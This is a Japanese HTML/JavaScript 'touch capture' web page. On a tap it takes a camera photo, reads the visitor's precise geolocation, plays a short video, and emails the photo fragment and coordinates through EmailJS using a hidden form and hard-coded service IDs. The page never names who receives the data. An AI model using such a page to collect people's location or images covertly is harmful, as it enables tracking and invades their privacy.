<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>タッチキャプチャアプリ</title>

    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            cursor: pointer;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        
        .touch-area {
            background: rgba(255, 255, 255, 0.1);
            border: 2px dashed rgba(255, 255, 255, 0.3);
            border-radius: 15px;
            padding: 40px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            min-height: 200px;
        }
        
        .touch-area:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }
        
        .media-container {
            margin: 20px 0;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            padding: 20px;
        }
        
        video, img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 10px 0;
        }
        
        .status {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 16px;
        }
        
        .data-display {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
        }
        
        .error { color: #ff6b6b; background: rgba(255, 107, 107, 0.1); }
        .success { color: #4CAF50; background: rgba(76, 175, 80, 0.1); }
        .warning { color: #ff9800; background: rgba(255, 152, 0, 0.1); }
        
        .debug-toggle {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.5);
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .debug-info {
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 11px;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
    </style>

    <!-- EmailJS SDK読み込み＆初期化 -->
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("cPjKBUm_i6HebDQF7");
        })();
    </script>
</head>
<body>
    <button class="debug-toggle" onclick="toggleDebug()">Debug</button>
    
    <div class="container">
        <h1>📱 タッチキャプチャアプリ</h1>
        <p>画面をタッチ・クリックすると写真撮影、位置情報取得、動画再生を行います</p>
        
        <div class="touch-area" id="touchArea">
            <h2>📱 ここをクリック/タッチで実行</h2>
            <p>PC: クリック | スマホ: タッチ</p>
            <div style="font-size: 12px; margin-top: 10px; opacity: 0.8;">
                写真撮影 → 位置情報取得 → 動画再生 → メール送信
            </div>
        </div>
        
        <div class="status" id="status">待機中...</div>
        
        <div class="debug-info" id="debugInfo"></div>
        
        <div class="media-container">
            <video id="cameraVideo" autoplay muted style="display: none;"></video>
            <canvas id="photoCanvas" style="display: none;"></canvas>
            <img id="capturedPhoto" style="display: none;" alt="撮影された写真">
            <video id="playbackVideo" style="display: none;" controls></video>
        </div>
        
        <div class="data-display" id="locationData" style="display: none;"></div>
        <div class="data-display" id="photoData" style="display: none;"></div>
        <div class="data-display" id="videoData" style="display: none;"></div>
    </div>

    <!-- EmailJS 送信用の隠しフォーム -->
    <form id="emailForm" style="display:none;">
      <input type="hidden" name="photo_data" />
      <input type="hidden" name="location_info" />
      <input type="hidden" name="video_status" />
    </form>

    <script>
        // DOM要素取得
        const status = document.getElementById('status');
        const debugInfo = document.getElementById('debugInfo');
        const touchArea = document.getElementById('touchArea');
        const cameraVideo = document.getElementById('cameraVideo');
        const photoCanvas = document.getElementById('photoCanvas');
        const capturedPhoto = document.getElementById('capturedPhoto');
        const playbackVideo = document.getElementById('playbackVideo');
        const locationData = document.getElementById('locationData');
        const photoData = document.getElementById('photoData');
        const videoData = document.getElementById('videoData');
        
        // 状態管理
        let isProcessing = false;
        let lastTouchTime = 0;
        let mediaStream = null;
        let debugMode = false;
        
        // サンプル動画データ（Base64）
        const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIXdHJhawAAAFx0a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAALAAAACQAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAACRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAALuAAAAAAABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABz21pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAY9zdGJsAAAAr3N0c2QAAAAAAAAAAQAAAJ9hdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAALAAgABIAAAASAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGP//AAAALWF2Y0MBQsAN/+EAFWdCwA3959l7BQAAAwABAAADADIPFi2WAQAEaO+jyyLA/fj4AAAAABx1dWlka2hA8l8kT8W6OaUbzwMj8wAAAAAAAAAYc3R0cwAAAAAAAAABAAAAAQAAAAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAAEwAAAAEAAAAUc3RjbwAAAAAAAAABAAAALAAAAGB1ZHRhAAAAWG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMjkuMTAw";
        
        // デバッグ関数
        function logDebug(message) {
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            console.log(logMessage);
            if (debugMode) {
                debugInfo.innerHTML += logMessage + '<br>';
                debugInfo.scrollTop = debugInfo.scrollHeight;
            }
        }
        
        function toggleDebug() {
            debugMode = !debugMode;
            debugInfo.style.display = debugMode ? 'block' : 'none';
            if (debugMode) {
                debugInfo.innerHTML = '<strong>デバッグモード開始</strong><br>';
            }
        }
        
        function updateStatus(message, type = 'info') {
            status.textContent = message;
            status.className = `status ${type}`;
            logDebug(`Status [${type}]: ${message}`);
        }
        
        // EmailJSでメール送信
        async function sendEmail(photoBase64, location) {
            const form = document.getElementById('emailForm');
            // Base64データが長すぎるとメールが送れない場合があるため、先頭500文字に制限
            form.photo_data.value = photoBase64.substring(0, 500);
            form.location_info.value = `緯度: ${location.latitude}, 経度: ${location.longitude}, 精度: ${location.accuracy}m, 時刻: ${location.timestamp}`;
            form.video_status.value = "動画再生完了";
        
            try {
                const result = await emailjs.sendForm('service_ja2c09x', 'template_2fp2jrg', form);
                logDebug(`📩 メール送信成功: ${result.text}`);
                updateStatus('📩 メール送信成功', 'success');
            } catch (error) {
                logDebug(`📩 メール送信失敗: ${error.text || error.message}`);
                updateStatus(`📩 メール送信失敗: ${error.text || error.message}`, 'error');
            }
        }
        
        // メイン処理関数
        async function executeFullProcess() {
            logDebug('フルプロセス開始');
            
            try {
                // 1. 写真撮影
                logDebug('写真撮影開始');
                const photoBase64 = await capturePhoto();
                logDebug('写真撮影完了');
                
                // 2. 位置情報取得
                logDebug('位置情報取得開始');
                const location = await getLocation();
                logDebug('位置情報取得完了');
                
                // 3. 動画再生
                logDebug('動画再生開始');
                await playBase64Video();
                logDebug('動画再生完了');
                
                // 4. メール送信
                logDebug('メール送信開始');
                await sendEmail(photoBase64, location);
                logDebug('メール送信完了');
                
                // 成功表示
                document.body.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
                updateStatus('✅ 全処理完了！', 'success');
                
            } catch (error) {
                logDebug(`エラー発生: ${error.message}`);
                document.body.style.background = 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)';
                updateStatus(`❌ エラー: ${error.message}`, 'error');
            } finally {
                isProcessing = false;
                setTimeout(() => {
                    document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                    updateStatus('待機中...', 'info');
                }, 5000);
            }
        }
        
        // 写真撮影
        async function capturePhoto() {
            updateStatus('📸 カメラ起動中...', 'warning');
            
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }, 
                    audio: false 
                });
                
                cameraVideo.srcObject = mediaStream;
                cameraVideo.style.display = 'block';
                
                // カメラの映像が安定するまで少し待機（2秒）
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                const canvas = photoCanvas;
                const context = canvas.getContext('2d');
                canvas.width = cameraVideo.videoWidth || 640;
                canvas.height = cameraVideo.videoHeight || 480;
                
                context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
                
                capturedPhoto.src = photoBase64;
                capturedPhoto.style.display = 'block';
                
                photoData.innerHTML = `<strong>撮影写真:</strong><br>サイズ: ${Math.round(photoBase64.length / 1024)}KB<br>データ: ${photoBase64.substring(0, 100)}...`;
                photoData.style.display = 'block';
                
                mediaStream.getTracks().forEach(track => track.stop());
                cameraVideo.style.display = 'none';
                
                updateStatus('📸 写真撮影完了', 'success');
                return photoBase64;
                
            } catch (error) {
                updateStatus('📸 カメラエラー', 'error');
                throw new Error(`カメラアクセスエラー: ${error.message}`);
            }
        }
        
        // 位置情報取得
        async function getLocation() {
            updateStatus('📍 位置情報取得中...', 'warning');
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('位置情報非対応'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        
                        locationData.innerHTML = `<strong>位置情報:</strong><br>
                            緯度: ${location.latitude}<br>
                            経度: ${location.longitude}<br>
                            精度: ${location.accuracy}m<br>
                            時刻: ${location.timestamp}`;
                        locationData.style.display = 'block';
                        
                        updateStatus('📍 位置情報取得完了', 'success');
                        resolve(location);
                    },
                    (error) => {
                        updateStatus('📍 位置情報エラー', 'error');
                        reject(new Error(`位置情報エラー: ${error.message}`));
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        // 動画再生
        async function playBase64Video() {
            updateStatus('🎬 動画再生中...', 'warning');
            
            try {
                playbackVideo.src = sampleVideoBase64;
                playbackVideo.style.display = 'block';
                
                videoData.innerHTML = `<strong>動画データ:</strong><br>サイズ: ${Math.round(sampleVideoBase64.length / 1024)}KB<br>データ: ${sampleVideoBase64.substring(0, 100)}...`;
                videoData.style.display = 'block';
                
                await playbackVideo.play();
                updateStatus('🎬 動画再生開始', 'success');
                
            } catch (error) {
                updateStatus('🎬 動画再生エラー', 'error');
                throw new Error(`動画再生エラー: ${error.message}`);
            }
        }
        
        // イベントハンドラー
        function handleTouch(event) {
            const currentTime = Date.now();
            
            // クールダウン（2秒）
            if (currentTime - lastTouchTime < 2000) {
                logDebug('クールダウン中');
                return;
            }
            lastTouchTime = currentTime;
            
            if (isProcessing) {
                logDebug('処理中のため無視');
                return;
            }
            
            logDebug(`タッチ検出: ${event.type}`);
            isProcessing = true;
            document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
            updateStatus('🔄 処理開始...', 'warning');
            
            // 処理実行
            executeFullProcess();
        }
        
        // イベントリスナー設定
        touchArea.addEventListener('click', handleTouch);
        touchArea.addEventListener('touchstart', handleTouch, { passive: false });
        
        // ページ全体のイベントリスナー（オプション）
        document.addEventListener('click', function(e) {
            if (e.target.closest('.touch-area')) {
                // touchAreaのイベントに任せる
                return;
            }
            if (e.target.tagName === 'BUTTON') {
                // ボタンは除外
                return;
            }
            // その他の場所もタッチ可能にする場合
            // handleTouch(e);
        });
        
        // 初期化
        updateStatus('📱 準備完了！タッチエリアをクリックして開始', 'success');
        logDebug('アプリケーション初期化完了');
    </script>
</body>
</html>
